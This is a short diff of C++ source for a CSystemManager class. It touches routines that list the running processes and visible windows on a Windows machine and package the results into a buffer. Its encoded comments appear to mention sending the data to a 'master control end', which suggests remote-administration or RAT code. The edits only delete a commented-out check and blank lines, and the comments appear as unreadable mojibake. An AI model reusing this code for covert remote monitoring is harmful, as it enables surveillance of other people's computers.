@@ -84,9 +84,6 @@ LPBYTE CSystemManager::GetProcessList()
 			//´ò¿ª½ø³Ì²¢·µ»Ø¾ä±ú
 			hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, 
 				FALSE, pe32.th32ProcessID);   //´ò¿ªÄ¿±ê½ø³Ì  
-
-			//	if ((pe32.th32ProcessID !=0) && 
-			//		(pe32.th32ProcessID !=4))
 			{
 				//Ã¶¾ÙµÚÒ»¸öÄ£¿é¾ä±úÒ²¾ÍÊÇµ±Ç°½ø³ÌÍêÕûÂ·¾¶
 				EnumProcessModules(hProcess, &hModules, sizeof(hModules), &cbNeeded);
@@ -240,7 +237,6 @@ LPBYTE CSystemManager::GetWindowsList()
 	EnumWindows((WNDENUMPROC)EnumWindowsProc, (LPARAM)&szBuffer);  //×¢²áº¯Êı
 	//Èç¹ûAPIº¯Êı²ÎÊıµ±ÖĞÓĞº¯ÊıÖ¸Õë´æÔÚ 
 	//¾ÍÊÇÏòÏµÍ³×¢²áÒ»¸ö »Øµ÷º¯Êı
-
 	szBuffer[0] = TOKEN_WSLIST;
 	return szBuffer;  	
 }
@@ -260,7 +256,6 @@ BOOL CALLBACK CSystemManager::EnumWindowsProc(HWND hWnd, LPARAM lParam)  //ÒªÊı¾
 	if (!IsWindowVisible(hWnd) || lstrlen(szTitle) == 0)
 		return true;
 	//Í¬½ø³Ì¹ÜÀíÒ»ÑùÎÒÃÇ×¢ÒâËûµÄ·¢ËÍµ½Ö÷¿Ø¶ËµÄÊı¾İ½á¹¹
-
 	if (szBuffer == NULL)
 		szBuffer = (LPBYTE)LocalAlloc(LPTR, 1);  //ÔİÊ±·ÖÅä»º³åÇø 
 
